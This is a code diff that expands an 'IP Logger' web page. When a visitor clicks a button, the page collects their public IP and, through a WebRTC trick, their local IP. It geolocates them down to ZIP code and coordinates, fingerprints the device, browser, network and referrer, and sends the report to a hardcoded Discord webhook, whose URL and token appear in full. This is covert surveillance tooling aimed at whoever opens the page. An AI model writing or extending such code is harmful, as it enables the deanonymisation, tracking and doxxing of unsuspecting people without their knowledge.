@@ -20,6 +20,74 @@
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
+        // Function to detect device type
+        function detectDevice() {
+            const ua = navigator.userAgent;
+            
+            // Device type
+            let deviceType = 'Desktop';
+            if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua.toLowerCase())) {
+                deviceType = 'Mobile';
+            } else if (/tablet|ipad|android(?!.*mobile)/i.test(ua.toLowerCase())) {
+                deviceType = 'Tablet';
+            }
+            
+            // OS detection
+            let os = 'Unknown OS';
+            if (/windows/i.test(ua)) os = 'Windows';
+            else if (/mac os|macintosh/i.test(ua)) os = 'macOS';
+            else if (/linux/i.test(ua)) os = 'Linux';
+            else if (/android/i.test(ua)) os = 'Android';
+            else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
+            else if (/cros/i.test(ua)) os = 'Chrome OS';
+            
+            // Browser detection
+            let browser = 'Unknown Browser';
+            if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
+            else if (/firefox/i.test(ua)) browser = 'Firefox';
+            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
+            else if (/edg/i.test(ua)) browser = 'Edge';
+            else if (/opera|opr/i.test(ua)) browser = 'Opera';
+            else if (/msie|trident/i.test(ua)) browser = 'Internet Explorer';
+            
+            // Device manufacturer/brand
+            let brand = 'Unknown';
+            if (/iphone|ipad|ipod/i.test(ua)) brand = 'Apple';
+            else if (/samsung/i.test(ua)) brand = 'Samsung';
+            else if (/huawei/i.test(ua)) brand = 'Huawei';
+            else if (/xiaomi|redmi|poco/i.test(ua)) brand = 'Xiaomi';
+            else if (/oneplus/i.test(ua)) brand = 'OnePlus';
+            else if (/google pixel/i.test(ua)) brand = 'Google';
+            else if (/sony/i.test(ua)) brand = 'Sony';
+            else if (/lg/i.test(ua)) brand = 'LG';
+            else if (/motorola/i.test(ua)) brand = 'Motorola';
+            else if (/nokia/i.test(ua)) brand = 'Nokia';
+            
+            // CPU architecture
+            let cpuArch = navigator.cpuClass || 'Unknown';
+            
+            // Device memory
+            let deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+            
+            // Max touch points
+            let maxTouchPoints = navigator.maxTouchPoints || 'Unknown';
+            
+            // Is it a bot?
+            const isBot = /bot|crawler|spider|crawling/i.test(ua) ? 'Yes' : 'No';
+            
+            return {
+                deviceType,
+                os,
+                browser,
+                brand,
+                cpuArch,
+                deviceMemory,
+                maxTouchPoints,
+                isBot,
+                userAgent: ua
+            };
+        }
+        
         document.getElementById('trackButton').addEventListener('click', async function() {
             const button = this;
             const status = document.getElementById('status');
@@ -34,8 +102,10 @@
                 const ipData = await ipResponse.json();
                 const publicIP = ipData.ip;
                 
-                // Get location info
-                let city = 'Unknown', region = 'Unknown', country = 'Unknown', isp = 'Unknown';
+                // Get detailed location info
+                let city = 'Unknown', region = 'Unknown', country = 'Unknown', isp = 'Unknown', 
+                    zip = 'Unknown', timezone = 'Unknown', lat = 'Unknown', lon = 'Unknown';
+                    
                 try {
                     const locationResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                     const locationData = await locationResponse.json();
@@ -43,11 +113,15 @@
                     region = locationData.region || 'Unknown';
                     country = locationData.country_name || 'Unknown';
                     isp = locationData.org || 'Unknown';
+                    zip = locationData.postal || 'Unknown';
+                    timezone = locationData.timezone || 'Unknown';
+                    lat = locationData.latitude || 'Unknown';
+                    lon = locationData.longitude || 'Unknown';
                 } catch (e) {
                     console.log('Location API failed');
                 }
                 
-                // Get local IP (using WebRTC trick)
+                // Get local IP (WebRTC trick)
                 let localIP = 'N/A';
                 try {
                     const pc = new RTCPeerConnection({iceServers:[]});
@@ -63,6 +137,53 @@
                     console.log('Local IP detection failed');
                 }
                 
+                // Detect device info
+                const deviceInfo = detectDevice();
+                
+                // Get screen resolution
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const screenDepth = screen.colorDepth;
+                const pixelRatio = window.devicePixelRatio || 1;
+                
+                // Get browser plugins
+                const plugins = [];
+                for(let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                const pluginsList = plugins.slice(0, 5).join(', ') + (plugins.length > 5 ? '...' : '');
+                
+                // Get cookies enabled
+                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                
+                // Get doNotTrack status
+                const doNotTrack = navigator.doNotTrack || 'Unknown';
+                
+                // Get online status
+                const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+                
+                // Get referrer
+                const referrer = document.referrer || 'Direct visit';
+                
+                // Get page load time
+                const loadTime = performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'Unknown';
+                
+                // Get timezone offset
+                const timezoneOffset = new Date().getTimezoneOffset();
+                const timezoneOffsetStr = `${Math.abs(timezoneOffset/60)} hours ${timezoneOffset < 0 ? 'ahead' : 'behind'} UTC`;
+                
+                // Get connection info
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                let connectionType = 'Unknown';
+                let effectiveType = 'Unknown';
+                let downlink = 'Unknown';
+                
+                if (connection) {
+                    connectionType = connection.type || 'Unknown';
+                    effectiveType = connection.effectiveType || 'Unknown';
+                    downlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
+                }
+                
                 const now = new Date();
                 const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
                 let hours = now.getHours();
@@ -71,39 +192,54 @@
                 hours = hours ? hours : 12;
                 const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                 
-                // Create Discord embed
+                // Create Discord embed with device info
                 const embed = {
-                    title: "IP Captured",
+                    title: "IP Captured - Device Report",
                     color: 16711680, // Red color
                     fields: [
                         {
                             name: "IP Addresses",
-                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\``,
-                            inline: false
-                        },
-                        {
-                            name: "Location",
-                            value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}\n**ISP:** ${isp}`,
+                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\`\n**ISP:** ${isp}`,
                             inline: true
                         },
                         {
-                            name: "System Info",
-                            value: `**Browser:** ${navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown'}\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}`,
+                            name: "Location Details",
+                            value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}\n**ZIP:** ${zip}\n**Coords:** ${lat}, ${lon}`,
                             inline: true
                         },
                         {
-                            name: "Timestamp",
-                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**UTC:** ${now.toISOString()}`,
+                            name: "Device Information",
+                            value: `**Type:** ${deviceInfo.deviceType}\n**Brand:** ${deviceInfo.brand}\n**OS:** ${deviceInfo.os}\n**Browser:** ${deviceInfo.browser}\n**Is Bot:** ${deviceInfo.isBot}`,
+                            inline: true
+                        },
+                        {
+                            name: "Hardware Details",
+                            value: `**CPU:** ${deviceInfo.cpuArch}\n**RAM:** ${deviceInfo.deviceMemory}\n**Touch Points:** ${deviceInfo.maxTouchPoints}\n**Screen:** ${screenWidth}x${screenHeight}\n**Pixel Ratio:** ${pixelRatio}`,
+                            inline: true
+                        },
+                        {
+                            name: "Network & Connection",
+                            value: `**Connection:** ${connectionType}\n**Speed Type:** ${effectiveType}\n**Downlink:** ${downlink}\n**Online:** ${onlineStatus}\n**Timezone:** ${timezone}`,
+                            inline: true
+                        },
+                        {
+                            name: "Browser Settings",
+                            value: `**Cookies:** ${cookiesEnabled}\n**Do Not Track:** ${doNotTrack}\n**Language:** ${navigator.language}\n**Plugins:** ${pluginsList || 'None'}\n**Color Depth:** ${screenDepth}bit`,
+                            inline: true
+                        },
+                        {
+                            name: "Session Details",
+                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**Timezone Offset:** ${timezoneOffsetStr}\n**Load Time:** ${loadTime}ms\n**Referrer:** ${referrer}`,
                             inline: false
                         },
                         {
-                            name: "Page URL",
-                            value: window.location.href,
+                            name: "Full User Agent",
+                            value: `\`\`\`${deviceInfo.userAgent.substring(0, 350)}\`\`\``,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: "IP Logger • Click logged"
+                        text: "IP Logger • Device report generated"
                     },
                     timestamp: new Date().toISOString()
                 };
